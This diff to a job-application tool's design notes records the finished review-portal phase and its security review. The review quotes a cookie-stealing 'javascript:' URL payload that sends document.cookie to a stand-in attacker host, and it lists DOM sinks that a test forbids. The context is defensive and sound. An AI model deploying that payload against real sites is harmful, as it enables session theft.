@@ -17,7 +17,7 @@ Phases are defined in `architecture.md` §33. Build one at a time. Do not skip a
 | 4 | Fact store, `.docx`/`.pdf` import as draft facts, **archetype** resumes, claim validation, resume diff, `.docx` output | done |
 | 5 | Application tracking, state history, notes, recommendation overrides, application question bank, form inspection | done |
 | 6 | SQL search, FTS5, funnel + segment analytics, `stats`, `search`, `ask` | done |
-| 6.5 | Review portal: queue, application timeline, analytics | not started |
+| 6.5 | Review portal: queue, application timeline, analytics | done |
 | 7 | Career memory / local RAG | speculative |
 | 8 | Learning loop | speculative |
 | 9 | Desktop application shell (Tauri over the portal, CLI as sidecar) | planned (see `docs/vision.md`) |
@@ -118,6 +118,91 @@ Phases are defined in `architecture.md` §33. Build one at a time. Do not skip a
 | 2026-08-14 | Every derived document detects change by content, not by identity. | A cross-model review pointed out that evaluations and notes were keyed on their id alone. Nothing edits them today, so nothing was stale — but an index whose correctness rests on nobody adding an edit path later is one that goes stale quietly. Jobs still compare their stored `description_hash`, because re-hashing 100 KB bodies to ask "did anything change?" makes the cheap question expensive. |
 | 2026-08-14 | The funnel window is applied *inside* the latest-verdict subquery. | Taking the latest verdict overall and then filtering by date meant a role recommended in July and re-evaluated in September reported July as recommending nothing. A later opinion must not rewrite an earlier month. |
 | 2026-08-14 | The correlated "latest verdict per role" join stays, because it was measured. | The review predicted it would degrade badly. `scripts/measure-search.ts` at 10,000 jobs: index build 512 ms, incremental sync 82 ms, keyword search 15 ms, that join 4 ms, funnel 3 ms. It is an index seek per row, not a scan. |
+| 2026-08-14 | The portal's decision button reads "Record that I applied", not "Apply". | It records an application and opens the posting in a new tab; it has no way to submit a form. A button labelled "Apply" in a tool that cannot apply is the one place this product could most easily mislead somebody about what it just did for them. |
+| 2026-08-14 | The review queue keeps a decided role visible with its decision, rather than removing it. | A queue that empties as you act on it cannot be checked afterwards. It is a record, not an inbox. |
+| 2026-08-14 | A posting's title reaches the portal verbatim, including markup, and is placed with `textContent`. | Rewriting a title would misquote the employer. The safety property is not that markup is absent — it is that markup can only ever be displayed. A test asserts the review script contains no `innerHTML`, `outerHTML`, `insertAdjacentHTML` or `document.write`. |
+| 2026-08-14 | Only canonicalised `https` links leave the portal, `/api/decide` takes no URL from the request, and the page refuses to open any other scheme. | A cross-model review found that `source_url` is stored raw when canonicalisation fails, so `javascript:` in a posting reached the queue as the link and was passed to `open()` when the user recorded that they had applied. Three layers, because a click-to-execute sink deserves more than one. |
+| 2026-08-14 | The search index is refreshed when `roleeye ui` starts, never by a route. | `GET /api/history` was calling the default `search()`, which syncs — a write transaction over the whole corpus, from a GET, repeatable in a loop. |
+| 2026-08-14 | `listRecommendations` breaks a timestamp tie by insertion order. | `MAX(created_at)` returns both rows when two evaluations of one role land in the same millisecond, so the review queue showed the role twice with contradictory advice. The same defect had already been fixed once, in status history. |
+
+## Phase 6.5 notes
+
+The portal stops being a setup wizard. Four views now: Setup, Review,
+Applications, Reports.
+
+### Nothing new is decided in the web layer
+
+Every route calls the function the CLI calls — `recordApplication`, `skipRole`,
+`addNote`, `setStatus`, `funnel`, `segments`, `search`. If the portal and the
+terminal could disagree about what applying to a role means, one of them would
+be lying and it would not be obvious which.
+
+That constraint is what made this phase small: three files, no new tables, no
+new domain logic. The work was in the views, not underneath them.
+
+### Apply records; it cannot apply
+
+The button says "Record that I applied", records the application, and opens the
+employer's page in a new tab. It has no way to submit anything, and the copy
+beside it says so. A button labelled "Apply" in a tool that cannot apply is the
+one place this product could most easily mislead somebody about what it just
+did on their behalf.
+
+The queue keeps a decided role visible with its decision beside it rather than
+removing it. A queue that empties as you act on it cannot be checked afterwards.
+
+### Two layers against hostile text, because one is a promise
+
+Job postings are written by strangers. The server bounds every string and
+flattens it to one line — that is what stops a terminal escape or a newline from
+rewriting the layout — and the page builds every node through `textContent`.
+
+A *title* is passed through verbatim, angle brackets and all, because rewriting
+it would misquote the employer. The safety property is not that markup is
+removed; it is that markup can only ever be displayed. A test asserts the review
+script contains no `innerHTML`, `outerHTML`, `insertAdjacentHTML` or
+`document.write`, and the page's CSP already forbids everything else.
+
+### What opening the page found
+
+The script is a string inside a `.ts` file, so it is executed against a DOM shim
+in tests, as the configuration page already was. That caught nothing this time.
+Opening the real page in a real browser caught the thing the shim cannot see: a
+CSS collision. `.co` was already the catalog's full-width company card, so every
+review card rendered the employer's name inside a bordered box on its own line.
+Renamed to `.byline`.
+
+The other find was a test that had been quietly protecting the right rule:
+`portal.test.ts` asserts free text exists only where free text belongs. The
+history search box tripped it. The assertion was updated with the reason —
+searching is not configuration, nothing typed into it is saved, and there is no
+set of options to pick from — rather than deleted.
+
+### What a cross-model review found
+
+The worst of it was a URL. `canonicalizeUrl` accepts only `http:` and `https:`,
+but a posting's `source_url` is stored raw when canonicalisation fails — so a
+posting advertising `javascript:fetch('http://attacker/'+document.cookie)`
+reached the queue, was displayed as the link, was saved as the place the user
+applied, and was handed to `open()` the moment they pressed *Record that I
+applied*. `noopener` is irrelevant to that: it is not a window-reference
+problem, it is a scheme problem.
+
+Three changes, because one was not enough for a sink this bad: the server emits
+only canonicalised `https` links, `/api/decide` no longer accepts a URL from the
+request at all (`recordApplication` derives it from the posting), and the page
+refuses to open anything that is not `http`/`https`. The DOM harness now presses
+the button on a role whose only link is script, with a spy on `open`.
+
+The rest:
+
+| Finding | What it allowed |
+|---|---|
+| `GET /api/history` refreshed the search index | A read ran a write transaction over the whole corpus — from a GET, unthrottled, in a loop if a page wanted one. `roleeye ui` syncs once at startup; the route is read-only. |
+| `listRecommendations` picked the latest verdict with `MAX(created_at)` | Two evaluations of one role saved in the same millisecond both satisfy the maximum, so the queue showed one role twice with contradictory advice. It orders by insertion within the instant now, exactly as status history already had to. |
+| `/api/pipeline` and `/api/job` had unbounded fan-out | Every application, with every status event and every note, built into one response by the single process everything else runs in. All three are bounded and the page can ask for a page size, capped. |
+| `since` was passed to the report window unvalidated | `?since=whenever` silently produced a report over a window nobody asked for. It is a 400 now. |
+| `POST /api/note` had no way to be called | The route existed and no button reached it. Notes are the thing a scraper cannot know — who the recruiter was, what the salary conversation actually said — so the detail panel now has the field. |
 
 ## Phase 6 notes
 
